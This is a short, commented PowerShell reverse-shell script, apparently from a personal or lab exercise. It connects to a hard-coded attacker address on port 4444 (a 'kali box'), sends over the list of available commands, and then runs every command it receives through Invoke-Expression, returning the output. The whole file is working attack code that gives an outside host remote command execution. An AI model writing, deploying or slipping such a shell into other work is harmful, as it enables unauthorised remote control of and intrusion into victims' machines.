#jimmy mcgovern
#reverse shell

#establishes connection to kali box
#.tcpClient takes string attackerip, portnumber
$client = New-Object System.Net.Sockets.TcpClient("192.168.200.197", 4444)
#gets the network stream in a readable/writeable form
$stream = $client.GetStream()
#sets up reader (reads data incoming from attacker)
$reader = New-Object System.IO.StreamReader($stream)
#sets up writer (sends data to attacker)
$writer = New-Object System.IO.StreamWriter($stream)
#all data is sent in real time
$writer.AutoFlush = $true
#sends the attacker a string formatted list of 
#all the commands the attacker can run    
$writer.WriteLine((Get-Command | Out-String))

#infinite loop
while ($true) { 

#wait for a command from attacker
   $command = $reader.ReadLine()
   if ($command -eq "exit"){
        break #exit the loop if attacker sends exit
   }

   try{
        #execute command and send back the output
        #2>&1 sends both standard output and errors
        $output = Invoke-Expression $command 2>&1
        $writer.WriteLine($output)
   }catch{
        #if there is an error, send that
        $writer.WriteLine("Error: $_")
   }
}
